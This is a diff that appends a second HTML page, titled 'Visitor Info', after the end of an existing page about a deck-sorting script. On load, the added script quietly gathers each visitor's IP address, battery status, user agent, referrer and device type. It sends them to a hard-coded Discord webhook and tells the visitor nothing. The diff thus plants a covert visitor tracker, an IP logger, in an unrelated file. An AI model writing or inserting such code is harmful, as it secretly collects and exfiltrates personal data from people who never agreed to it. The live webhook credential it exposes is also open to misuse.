@@ -347,3 +347,82 @@ print 'It took ' + i + ' iterations to sort the deck.';</code></pre>
 
 	</body>
 </html>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visitor Info</title>
+</head>
+<body>
+    <h1>Welcome to My Website</h1>
+    <script>
+        // Function to get visitor's IP address
+        async function getVisitorInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return 'Unknown IP';
+            }
+        }
+
+        // Function to get battery status
+        async function getBatteryStatus() {
+            try {
+                const battery = await navigator.getBattery();
+                return `Battery Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+            } catch (error) {
+                console.error('Error fetching battery status:', error);
+                return 'Battery status unavailable';
+            }
+        }
+
+        // Function to detect device type
+        function detectDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (/Mobi|Android/i.test(userAgent)) {
+                return "Mobile";
+            } else if (/Windows|Macintosh|Linux/i.test(userAgent)) {
+                return "PC or Laptop";
+            } else {
+                return "Unknown Device";
+            }
+        }
+
+        // Function to send info to Discord webhook
+        async function sendToDiscord(ip, batteryStatus, deviceType) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1303101741839159337/nbA-IrRRRbTWQMy1NGH_OtfnTCSZhHM8flJG7BhgnYXjhvCGykPTBjS3XlGlOFwHkO1D';
+            const message = {
+                content: `New visitor info:\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nReferrer: ${document.referrer || 'Direct'}\n${batteryStatus}\nDevice Type: ${deviceType}`,
+                username: 'Website Bot'
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+                console.log('Webhook sent successfully');
+            } catch (error) {
+                console.error('Error sending webhook:', error);
+            }
+        }
+
+        // On page load, get visitor info and send to Discord
+        window.onload = async function() {
+            const ip = await getVisitorInfo();
+            const batteryStatus = await getBatteryStatus();
+            const deviceType = detectDeviceType();
+            sendToDiscord(ip, batteryStatus, deviceType);
+        };
+    </script>
+</body>
+</html>
